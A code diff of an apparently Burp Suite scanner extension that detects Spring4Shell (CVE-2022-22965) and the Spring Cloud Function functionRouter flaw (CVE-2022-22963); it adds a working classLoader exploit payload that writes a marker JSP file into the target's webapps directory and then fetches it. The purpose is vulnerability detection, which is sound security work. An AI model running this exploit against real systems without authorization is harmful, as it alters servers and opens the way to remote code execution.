@@ -42,6 +42,7 @@ class BurpExtender(IBurpExtender, IScannerCheck):
 
     def doActiveScan(self, ihrr, isip):
         print(isip)
+        issues = ArrayList()
         global paths
         collab = self.callbacks.createBurpCollaboratorClientContext()
         collab_payload =collab.generatePayload(True)
@@ -56,7 +57,7 @@ class BurpExtender(IBurpExtender, IScannerCheck):
         attack_path = org_path[:last_slash]+'/'
         
         (req) = setBody(req,last_payload)
-        (req) = setRequestTypeAndPath(req,attack_path)
+        (req) = setRequestTypeAndPath(req,'POST',attack_path+'functionRouter')
         
         if attack_path in paths:
             return None
@@ -65,22 +66,32 @@ class BurpExtender(IBurpExtender, IScannerCheck):
         attack = gcallbacks.makeHttpRequest(ihrr.getHttpService(), req) 
         interactions = collab.fetchAllCollaboratorInteractions() 
         
+        #check for CVE-2022-22965
+        loc = run_exploit_22965(ihrr,attack_path,"ROOT","offsec")
+        print("ok2")
+        (ignore, req) = setHeader(ihrr.getRequest(), 'Content-Type', 'application/x-www-form-urlencoded', True)
+        (req) = setRequestTypeAndPath(req,'GET',loc)
+        attack_5 = gcallbacks.makeHttpRequest(ihrr.getHttpService(), req)
+        response_5 = safe_bytes_to_string(attack_5.getResponse())
+        print(response_5)
+        print('s4s_scanner_006' in response_5)
+        if 's4s_scanner_006' in response_5:
+            issues.add(aS4S(ihrr, self.callbacks, self.helpers,5))
         if interactions:
-            issues = ArrayList()
-            issues.add(aS4S(attack, self.callbacks, self.helpers))
-            return issues
-
-        return []
+            issues.add(aS4S(attack, self.callbacks, self.helpers,3))
+        
+        return issues if issues.size() > 0 else []
     
     def consolidateDuplicateIssues(self, existingIssue, newIssue):
         return is_same_issue(existingIssue, newIssue)
 
 
 class aS4S(IScanIssue):
-    def __init__(self, reqres, callbacks, helpers):
+    def __init__(self, reqres, callbacks, helpers, type):
         self.reqres = reqres
         self.callbacks = callbacks
         self.helpers = helpers
+        self.type = type
 
     def getHost(self):
         return self.reqres.getHost()
@@ -95,7 +106,10 @@ class aS4S(IScanIssue):
         return self.reqres.getUrl()
 
     def getIssueName(self):
-        return 'Spring4Shell is Detected'
+        if self.type == 5:
+            return 'CVE-2022-22965 - Spring4Shell is Detected'
+        else:
+            return 'CVE-2022-22963 - functionRouter Shell is Detected'
 
     def getIssueType(self):
         return 0x00101000  # See http://portswigger.net/burp/help/scanner_issuetypes.html
@@ -230,11 +244,11 @@ def setBody(request, value):
     body_start = i
     
     real_start = ghelpers.analyzeRequest(request).getBodyOffset()
-    modified_request = request[:real_start-2]+ request[real_start:]+ ghelpers.stringToBytes( '\r\n\r\n'+value) 
+    modified_request = request[:real_start-2]+ request[real_start:]+ ghelpers.stringToBytes( '\r\n'+value) 
     
     return modified_request
 
-def setRequestTypeAndPath(request,path):
+def setRequestTypeAndPath(request, type ,path):
     # directly change to post functionRouter
     prev = ''
     i = 0
@@ -248,7 +262,7 @@ def setRequestTypeAndPath(request,path):
     print(str(body_start))
     
     real_start = ghelpers.analyzeRequest(request).getBodyOffset()
-    modified_request = ghelpers.stringToBytes('POST '+path+'functionRouter HTTP/1.1')  + request[body_start:]
+    modified_request = ghelpers.stringToBytes(type+' '+path+' HTTP/1.1')  + request[body_start:]
     
     return modified_request
 
@@ -281,6 +295,28 @@ def add_body_to_request(request, body):
     h.extend(b)
     
     return add_header_to_request(safe_bytes_to_string(h),"Content-Length: ",str(len(body)))
+
+import time
+def run_exploit_22965(breq,url, directory, filename):
+    post_headers = {
+    "Content-Type": "application/x-www-form-urlencoded"
+    }
+    
+    file_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20out.println(%27s4s_scanner_006%27)%3B%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/"+directory+"&class.module.classLoader.resources.context.parent.pipeline.first.prefix="+filename+"&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
+    org_path = ghelpers.analyzeRequest(breq).getUrl().getPath()
+
+    for i in range(3):
+        (ignore, req) = setHeader(breq.getRequest(), 'Content-Type', 'application/x-www-form-urlencoded', True)
+        (ignore, req) = setHeader(req, 'Content-Length', str(len(file_data)), True)
+        (req) = setBody(req,file_data)
+        (req) = setRequestTypeAndPath(req,'POST',org_path)
+        attack = gcallbacks.makeHttpRequest(breq.getHttpService(), req)
+        time.sleep(1)
+
+    time.sleep(12)
+
+    return "/" + filename + ".jsp"
+
     
 def is_same_issue(existingIssue, newIssue):
     if existingIssue.getIssueName() == newIssue.getIssueName():
